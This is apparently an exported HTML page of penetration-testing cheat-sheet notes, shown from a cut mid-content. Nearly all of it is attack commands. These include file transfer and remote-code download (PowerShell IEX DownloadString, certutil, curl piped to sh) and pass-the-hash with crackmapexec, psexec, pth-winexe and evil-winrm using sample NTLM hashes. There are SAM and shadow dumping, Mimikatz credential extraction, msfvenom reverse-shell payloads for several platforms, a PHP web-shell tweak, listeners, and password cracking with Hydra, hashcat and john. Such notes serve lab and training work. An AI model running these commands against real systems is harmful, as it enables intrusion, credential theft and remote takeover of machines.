scp &lt;SOURCE_FILE&gt; &lt;USER&gt;@&lt;IP&gt;:&lt;DESTINATION_FILE&gt;</pre><pre class="hljs"><code><span class="hljs-comment"># PYTHON</span>
python -m SimpleHTTPServer <span class="hljs-variable">&lt;PORT&gt;</span>
python2.<span class="hljs-number">7</span> -c <span class="hljs-string">&quot;from urllib import urlretrieve; urlretrieve(&#x27;&lt;URL&gt;&#x27;, &#x27;&lt;DESTINATION_FILE&gt;&#x27;)&quot;</span>

<span class="hljs-comment"># FTP</span>
sudo python3 -m pyftpdlib  -p <span class="hljs-number">21</span> -w

<span class="hljs-comment"># SMB</span>
sudo smbserver.py -smb2support liodeus .

<span class="hljs-comment"># WGET</span>
wget <span class="hljs-variable">&lt;URL&gt;</span> -o <span class="hljs-variable">&lt;OUT_FILE&gt;</span>

<span class="hljs-comment"># CURL</span>
curl <span class="hljs-variable">&lt;URL&gt;</span> -o <span class="hljs-variable">&lt;OUT_FILE&gt;</span>

<span class="hljs-comment"># NETCAT</span>
nc -lvp <span class="hljs-number">1234</span> &gt; <span class="hljs-variable">&lt;OUT_FILE&gt;</span> 
nc <span class="hljs-variable">&lt;IP&gt;</span> <span class="hljs-number">1234</span> <span class="hljs-variable">&lt; &lt;IN_FILE&gt;</span> 

<span class="hljs-comment"># SCP</span>
scp <span class="hljs-variable">&lt;SOURCE_FILE&gt;</span> <span class="hljs-variable">&lt;USER&gt;</span>@<span class="hljs-variable">&lt;IP&gt;</span>:<span class="hljs-variable">&lt;DESTINATION_FILE&gt;</span></code></pre></div>
<h3 id="windows-2">Windows</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># FTP 
echo open &lt;IP&gt; 21 &gt; ftp.txt echo anonymous&gt;&gt; ftp.txt echo password&gt;&gt; ftp.txt echo binary&gt;&gt; ftp.txt echo GET &lt;FILE&gt; &gt;&gt; ftp.txt echo bye&gt;&gt; ftp.txt
ftp -v -n -s:ftp.txt

# SMB
copy \\&lt;IP&gt;\&lt;PATH&gt;\&lt;FILE&gt; # Linux -&gt; Windows
copy &lt;FILE&gt; \\&lt;IP&gt;\&lt;PATH&gt;\ # Windows -&gt; Linux

# Powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('&lt;URL&gt;')
powershell &quot;wget &lt;URL&gt;&quot;

# Python
python.exe -c &quot;from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')&quot;

# CertUtil
certutil.exe -urlcache -split -f &quot;&lt;URL&gt;&quot;

# NETCAT
nc -lvp 1234 &gt; &lt;OUT_FILE&gt; 
nc &lt;IP&gt; 1234 &lt; &lt;IN_FILE&gt;

# CURL
curl &lt;URL&gt; -o &lt;OUT_FILE&gt;</pre><pre class="hljs"><code># FTP 
<span class="hljs-keyword">echo</span> <span class="hljs-keyword">open</span> <span class="hljs-symbol">&lt;IP&gt;</span> <span class="hljs-number">21</span> &gt; ftp.txt <span class="hljs-keyword">echo</span> anonymous&gt;&gt; ftp.txt <span class="hljs-keyword">echo</span> password&gt;&gt; ftp.txt <span class="hljs-keyword">echo</span> binary&gt;&gt; ftp.txt <span class="hljs-keyword">echo</span> GET <span class="hljs-symbol">&lt;FILE&gt;</span> &gt;&gt; ftp.txt <span class="hljs-keyword">echo</span> bye&gt;&gt; ftp.txt
ftp -v -n -<span class="hljs-variable">s:ftp</span>.txt

# SMB
<span class="hljs-keyword">copy</span> \\<span class="hljs-symbol">&lt;IP&gt;</span>\<span class="hljs-symbol">&lt;PATH&gt;</span>\<span class="hljs-symbol">&lt;FILE&gt;</span> # Linux -&gt; Windows
<span class="hljs-keyword">copy</span> <span class="hljs-symbol">&lt;FILE&gt;</span> \\<span class="hljs-symbol">&lt;IP&gt;</span>\<span class="hljs-symbol">&lt;PATH&gt;</span>\ # Windows -&gt; Linux

# Powershell
powershell.<span class="hljs-keyword">exe</span> (New-Object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;&lt;URL&gt;&#x27;</span>, <span class="hljs-string">&#x27;&lt;DESTINATION_FILE&gt;&#x27;</span>)
powershell.<span class="hljs-keyword">exe</span> IEX (New-Object System.Net.WebClient).DownloadString(<span class="hljs-string">&#x27;&lt;URL&gt;&#x27;</span>)
powershell <span class="hljs-string">&quot;wget &lt;URL&gt;&quot;</span>

# Python
<span class="hljs-keyword">python</span>.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;from urllib import urlretrieve; urlretrieve(&#x27;&lt;URL&gt;&#x27;, &#x27;&lt;DESTINATION_FILE&gt;&#x27;)&quot;</span>

# CertUtil
certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> <span class="hljs-string">&quot;&lt;URL&gt;&quot;</span>

# NETCAT
nc -lvp <span class="hljs-number">1234</span> &gt; <span class="hljs-symbol">&lt;OUT_FILE&gt;</span> 
nc <span class="hljs-symbol">&lt;IP&gt;</span> <span class="hljs-number">1234</span> &lt; <span class="hljs-symbol">&lt;IN_FILE&gt;</span>

# CURL
curl <span class="hljs-symbol">&lt;URL&gt;</span> -<span class="hljs-keyword">o</span> <span class="hljs-symbol">&lt;OUT_FILE&gt;</span></code></pre></div>
<hr>
<h2 id="git">GIT</h2>
<h3 id="download-git">Download .git</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">mkdir &lt;DESTINATION_FOLDER&gt;
./gitdumper.sh &lt;URL&gt;/.git/ &lt;DESTINATION_FOLDER&gt;</pre><pre class="hljs"><code><span class="hljs-built_in">mkdir</span> <span class="hljs-symbol">&lt;DESTINATION_FOLDER&gt;</span>
./gitdumper.<span class="hljs-keyword">sh</span> <span class="hljs-symbol">&lt;URL&gt;</span>/.git/ <span class="hljs-symbol">&lt;DESTINATION_FOLDER&gt;</span></code></pre></div>
<h3 id="extract-git-content">Extract .git content</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">mkdir &lt;EXTRACT_FOLDER&gt;
./extractor.sh &lt;DESTINATION_FOLDER&gt; &lt;EXTRACT_FOLDER&gt;</pre><pre class="hljs"><code><span class="hljs-built_in">mkdir</span> <span class="hljs-symbol">&lt;EXTRACT_FOLDER&gt;</span>
./extractor.<span class="hljs-keyword">sh</span> <span class="hljs-symbol">&lt;DESTINATION_FOLDER&gt;</span> <span class="hljs-symbol">&lt;EXTRACT_FOLDER&gt;</span></code></pre></div>
<hr>
<h2 id="hashes">HASHES</h2>
<h3 id="get-hashes">Get hashes</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"></pre><pre class="hljs"><code></code></pre></div>
<h3 id="pass-the-hash">Pass the hash</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::</pre><pre class="hljs"><code># <span class="hljs-keyword">Login</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">only</span> <span class="hljs-keyword">with</span> hashdump
# <span class="hljs-keyword">From</span> this hashdump
# admin2:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7178</span>d3046e7ccfac0469f95588b6bdf7:::</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">## CRACK MAP EXEC

crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -H &lt;NTLM Hash&gt; --local-auth # Check other machines for dual access with the same hash; --sam (dump SAM file)

crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -p &lt;P@ssw0rd1&gt;</pre><pre class="hljs"><code><span class="hljs-comment">## CRACK MAP EXEC</span>

crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.68</span><span class="hljs-number">.122</span><span class="hljs-number">-126</span> -u fcastle -d MARVEL.<span class="hljs-keyword">local</span> -H &lt;NTLM Hash&gt; --<span class="hljs-keyword">local</span>-auth <span class="hljs-comment"># Check other machines for dual access with the same hash; --sam (dump SAM file)</span>

crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.68</span><span class="hljs-number">.122</span><span class="hljs-number">-126</span> -u fcastle -d MARVEL.<span class="hljs-keyword">local</span> -p &lt;P<span class="hljs-meta">@ssw</span>0rd1&gt;</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="##" data-joplin-source-open="```##&#10;" data-joplin-source-close="&#10;```">
psexec.py &quot;frank castle&quot;:@192.168.68.122 -hashes aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 # attempt to gain a shell</pre><pre class="hljs"><code>
psexec.py <span class="hljs-string">&quot;frank castle&quot;</span>:<span class="hljs-symbol">@192</span>.<span class="hljs-number">168.68</span>.<span class="hljs-number">122</span> -hashes aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 <span class="hljs-comment"># attempt to gain a shell</span></code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">## Pth-Winexe

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd</pre><pre class="hljs"><code><span class="hljs-comment">## Pth-Winexe</span>

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb <span class="hljs-regexp">//</span><span class="hljs-number">10.11</span>.<span class="hljs-number">1.24</span> cmd</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">##Evil-Winrm

evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

evil-winrm  -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'</pre><pre class="hljs"><code>#<span class="hljs-selector-id">#Evil-Winrm</span>

evil-winrm  -<span class="hljs-selector-tag">i</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span> -u Administrator -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;MySuperSecr3tPass123!&#x27;</span> -s <span class="hljs-string">&#x27;/home/foo/ps1_scripts/&#x27;</span> -e <span class="hljs-string">&#x27;/home/foo/exe_files/&#x27;</span>

evil-winrm  -<span class="hljs-selector-tag">i</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 -s <span class="hljs-string">&#x27;/home/foo/ps1_scripts/&#x27;</span> -e <span class="hljs-string">&#x27;/home/foo/exe_files/&#x27;</span></code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">## Impacket-PSexec:

python3 /usr/share/impacket/impacket/examples/psexec.py &quot;Administrator&quot;:@10.11.1.121 -hashes aad3b435b51404eeaad3b435b51404ee:57321e6a0eef2c45985c9fa49c5cd24f </pre><pre class="hljs"><code><span class="hljs-comment">## Impacket-PSexec:</span>

python3 <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/impacket/im</span>packet<span class="hljs-regexp">/examples/</span>psexec.py <span class="hljs-string">&quot;Administrator&quot;</span>:@<span class="hljs-number">10.11</span>.<span class="hljs-number">1.121</span> -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">57321</span>e6a0eef2c45985c9fa49c5cd24f </code></pre></div>
<h3 id="windows-3">Windows</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

samdump2 System SAM &gt; hashes</pre><pre class="hljs"><code>reg <span class="hljs-keyword">save</span> HKLM\SAM c:\SAM
reg <span class="hljs-keyword">save</span> HKLM\<span class="hljs-keyword">System</span> c:\<span class="hljs-keyword">System</span>

samdump2 <span class="hljs-keyword">System</span> SAM &gt; hashes</code></pre></div>
<h3 id="linux-3">Linux</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">unshadow passwd shadow &gt; hashes</pre><pre class="hljs"><code>unshadow passwd <span class="hljs-keyword">shadow </span>&gt; hashes</code></pre></div>
<hr>
<h2 id="mimikatz">MIMIKATZ</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">privilege::debug</pre><pre class="hljs"><code>privilege::debug</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache</pre><pre class="hljs"><code>sekurlsa::logonpasswords
sekurlsa::tickets /<span class="hljs-keyword">export</span>

kerberos::list /<span class="hljs-keyword">export</span>

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache</code></pre></div>
<hr>
<h2 id="miscellaneous">MISCELLANEOUS</h2>
<h3 id="get-a-windows-path-without-spaces">Get a Windows path without spaces</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># path.cmd
@echo off
echo %~s1

path.cmd &quot;C:\Program Files (x86)\Common Files\test.txt&quot;
C:\PROGRA~2\COMMON~1\test.txt -&gt; Valid path without spaces</pre><pre class="hljs"><code># <span class="hljs-type">path</span>.cmd
@echo <span class="hljs-keyword">off</span>
echo %~s1

<span class="hljs-type">path</span>.cmd &quot;C:\Program Files (x86)\Common Files\test.txt&quot;
C:\PROGRA~<span class="hljs-number">2</span>\COMMON~<span class="hljs-number">1</span>\test.txt -&gt; <span class="hljs-keyword">Valid</span> <span class="hljs-type">path</span> <span class="hljs-keyword">without</span> spaces</code></pre></div>
<hr>
<h2 id="msfvenom-payload">MSFVENOM PAYLOAD</h2>
<h3 id="linux-4">Linux</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell.elf</pre><pre class="hljs"><code>msfvenom -p linux/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;IP&gt; <span class="hljs-attribute">LPORT</span>=&lt;PORT&gt; -f elf &gt; shell.elf</code></pre></div>
<h3 id="windows-4">Windows</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe</pre><pre class="hljs"><code>msfvenom -<span class="hljs-keyword">p</span> windows/shell_reverse_tcp LHOST=<span class="hljs-symbol">&lt;IP&gt;</span> LPORT=<span class="hljs-symbol">&lt;PORT&gt;</span> -<span class="hljs-keyword">f</span> <span class="hljs-keyword">exe</span> &gt; <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span></code></pre></div>
<h3 id="php">PHP</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php

Then we need to add the &lt;?php at the first line of the file so that it will execute as a PHP webpage
cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</pre><pre class="hljs"><code>msfvenom -<span class="hljs-keyword">p</span> php/reverse_php LHOST=<span class="hljs-symbol">&lt;IP&gt;</span> LPORT=<span class="hljs-symbol">&lt;PORT&gt;</span> -<span class="hljs-keyword">f</span> raw &gt; <span class="hljs-keyword">shell</span>.php

Then we need <span class="hljs-keyword">to</span> <span class="hljs-built_in">add</span> the &lt;?php at the <span class="hljs-keyword">first</span> <span class="hljs-built_in">line</span> of the <span class="hljs-keyword">file</span> <span class="hljs-keyword">so</span> that it will <span class="hljs-keyword">execute</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> PHP webpage
<span class="hljs-keyword">cat</span> <span class="hljs-keyword">shell</span>.php | pbcopy &amp;&amp; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; <span class="hljs-keyword">shell</span>.php &amp;&amp; pbpaste &gt;&gt; <span class="hljs-keyword">shell</span>.php</code></pre></div>
<h3 id="asp">ASP</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp</pre><pre class="hljs"><code>msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;IP&gt; <span class="hljs-attribute">LPORT</span>=&lt;PORT&gt; -f asp &gt; shell.asp</code></pre></div>
<h3 id="jsp">JSP</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp</pre><pre class="hljs"><code>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;IP&gt; <span class="hljs-attribute">LPORT</span>=&lt;PORT&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp</code></pre></div>
<h3 id="war">WAR</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war</pre><pre class="hljs"><code>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;IP&gt; <span class="hljs-attribute">LPORT</span>=&lt;PORT&gt; -f war &gt; shell.war</code></pre></div>
<h3 id="python">Python</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py</pre><pre class="hljs"><code>msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;IP&gt; <span class="hljs-attribute">LPORT</span>=&lt;PORT&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py</code></pre></div>
<h3 id="bash">Bash</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh</pre><pre class="hljs"><code>msfvenom -p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;IP&gt; <span class="hljs-attribute">LPORT</span>=&lt;PORT&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh</code></pre></div>
<h3 id="perl">Perl</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.pl</pre><pre class="hljs"><code>msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;IP&gt; <span class="hljs-attribute">LPORT</span>=&lt;PORT&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.pl</code></pre></div>
<h3 id="listener">Listener</h3>
<h4 id="metasploit">Metasploit</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">use exploit/multi/handler
set PAYLOAD &lt;PAYLOAD&gt;
set LHOST &lt;LHOST&gt;
set LPORT &lt;LPORT&gt;
set ExitOnSession false
exploit -j -z</pre><pre class="hljs"><code>use exploit/multi/handler
<span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">&lt;PAYLOAD&gt;</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST &lt;LHOST&gt;</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT &lt;LPORT&gt;</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">ExitOnSession false</span>
exploit <span class="hljs-comment">-j -z</span></code></pre></div>
<h4 id="netcat">Netcat</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">nc -lvp &lt;PORT&gt;</pre><pre class="hljs"><code>nc -lvp <span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span></code></pre></div>
<hr>
<h2 id="password-cracking">PASSWORD CRACKING</h2>
<h3 id="online">Online</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
https://hashes.com/en/decrypt/hash</pre><pre class="hljs"><code>Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
https:<span class="hljs-regexp">//</span>hashes.com<span class="hljs-regexp">/en/</span>decrypt/hash</code></pre></div>
<h3 id="hydra">Hydra</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt x.x.x.x http-post-form &quot;LOGINPAGE:username=admin&amp;password=^PASS^:Invalid Password!&quot;
#Change http-post-form to http-get-form for get or post 
# -l = User</pre><pre class="hljs"><code>sudo hydra -l admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt x.x.x.x http-post-form <span class="hljs-string">&quot;LOGINPAGE:username=admin&amp;password=^PASS^:Invalid Password!&quot;</span>
<span class="hljs-comment">#Change http-post-form to http-get-form for get or post </span>
<span class="hljs-comment"># -l = User</span></code></pre></div>
<h3 id="hashcat">Hashcat</h3>
<h4 id="linux-password">Linux password</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hashcat -m 1800 -a 0 hash.txt rockyou.txt
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule</pre><pre class="hljs"><code>hashcat -m <span class="hljs-number">1800</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> hash<span class="hljs-selector-class">.txt</span> rockyou<span class="hljs-selector-class">.txt</span>
hashcat -m <span class="hljs-number">1800</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> hash<span class="hljs-selector-class">.txt</span> rockyou<span class="hljs-selector-class">.txt</span> -r OneRuleToRuleThemAll.rule</code></pre></div>
<h4 id="windows-password">Windows password</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule</pre><pre class="hljs"><code>hashcat -m <span class="hljs-number">1000</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> hash<span class="hljs-selector-class">.txt</span> rockyou<span class="hljs-selector-class">.txt</span>
hashcat -m <span class="hljs-number">1000</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> hash<span class="hljs-selector-class">.txt</span> rockyou<span class="hljs-selector-class">.txt</span> -r OneRuleToRuleThemAll.rule</code></pre></div>
<h4 id="others">Others</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hashcat --example-hashes | grep -i '&lt;BEGINNING_OF_HASH&gt;'</pre><pre class="hljs"><code><span class="hljs-string">hashcat</span> <span class="hljs-built_in">--example-hashes</span> | <span class="hljs-string">grep</span> -<span class="hljs-string">i</span> <span class="hljs-string">&#x27;&lt;BEGINNING_OF_HASH&gt;&#x27;</span></code></pre></div>
<h4 id="rules">Rules</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/NotSoSecure/password_cracking_rules</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/NotSoSecure/</span>password_cracking_rules</code></pre></div>
<h3 id="john">John</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">john --wordlist=&lt;PASSWORDS_LIST&gt; hash.txt</pre><pre class="hljs"><code>john <span class="hljs-attribute">--wordlist</span>=&lt;PASSWORDS_LIST&gt; hash.txt</code></pre></div>
<hr>
<h2 id="pivoting">PIVOTING</h2>
<h3 id="sshuttle">Sshuttle</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sshuttle &lt;USER&gt;@&lt;IP&gt; &lt;IP_OF_THE_INTERFACE&gt;/CIDR</pre><pre class="hljs"><code>sshuttle <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span>@<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">IP_OF_THE_INTERFACE</span>&gt;</span>/CIDR</code></pre></div>
<h3 id="proxychains">Proxychains</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">ssh -f -N -D 9050 &lt;USER&gt;@&lt;IP&gt;
proxychains &lt;COMMAND&gt;</pre><pre class="hljs"><code>ssh -f -N -D 9050 <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span>@<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>
proxychains <span class="hljs-tag">&lt;<span class="hljs-name">COMMAND</span>&gt;</span></code></pre></div>
<h3 id="interesting-link">Interesting link</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://artkond.com/2017/03/23/pivoting-guide/</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//</span>artkond.com<span class="hljs-regexp">/2017/</span><span class="hljs-number">03</span><span class="hljs-regexp">/23/</span>pivoting-guide/</code></pre></div>
<hr>
<h2 id="privile-escalation">PRIVILE ESCALATION</h2>
<h3 id="linux-5">Linux</h3>
<h4 id="enumeration-scripts">Enumeration scripts</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">bash LinEnum.sh
bash lse.sh -l 1
bash linpeas.sh
python linuxprivchecker.py
./unix-privesc-check standard</pre><pre class="hljs"><code>bash LinEnum.<span class="hljs-keyword">sh</span>
bash lse.<span class="hljs-keyword">sh</span> -<span class="hljs-keyword">l</span> <span class="hljs-number">1</span>
bash linpeas.<span class="hljs-keyword">sh</span>
<span class="hljs-keyword">python</span> linuxprivchecker.<span class="hljs-keyword">py</span>
./unix-privesc-check standard</code></pre></div>
<h2 id="enum-users-using-enum4linux">Enum users using enum4linux</h2>
<p>replace 'hostname' with target . Creates file containing found usernames</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">(echo; enum4linux -U hostname|grep user:|cut -d\[ -f2|cut -d\] -f1) &gt;
/home/kali/Desktop/users.txt</pre><pre class="hljs"><code>(echo; enum4linux -U hostname|<span class="hljs-keyword">grep</span> user:|cut -d\[ -f2|cut -d\] -f1) &gt;
<span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/u</span>sers.txt</code></pre></div>
<h2 id="linpeas">LinPEAS</h2>
<p><a data-from-md title='https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS' href='https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS'>https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python -m SimpleHTTPServer 80 #Host
